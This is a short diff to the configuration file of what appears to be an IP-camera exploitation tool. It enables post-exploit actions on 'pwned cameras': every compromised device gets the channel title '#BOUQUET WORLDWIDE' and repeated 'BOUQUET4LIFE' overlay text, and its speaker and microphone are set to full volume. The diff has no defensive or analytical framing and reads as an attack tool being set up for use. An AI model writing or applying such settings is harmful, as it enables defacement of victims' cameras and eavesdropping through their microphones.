@@ -27,6 +27,11 @@ login = "p2pwn" # 5-32 alphanumeric characters
 password = "p2password" # 8-32 alphanumeric characters
 
 [brand] # Branding settings applied after successful exploit
-enabled = false # Apply channel title and overlay text to pwned cameras
-channel_title = "" # Channel title template ({serial}, {model} placeholders)
-overlay_text = ["", "", "", "", ""] # Overlay text lines (up to 5 lines, supports {serial}, {model})
+enabled = true # Apply channel title and overlay text to pwned cameras
+channel_title = "#BOUQUET WORLDWIDE" # Channel title template ({serial}, {model} placeholders)
+overlay_text = ["BOUQUET4LIFE", "BOUQUET4LIFE", "BOUQUET4LIFE", "BOUQUET4LIFE"] # Overlay text lines (up to 5 lines, supports {serial}, {model})
+
+[audio] # Audio volume settings applied after successful exploit
+enabled = true # Set speaker and microphone volume to 100%
+speaker_volume = 100 # Speaker volume level (0-100)
+mic_volume = 100 # Microphone volume level (0-100)
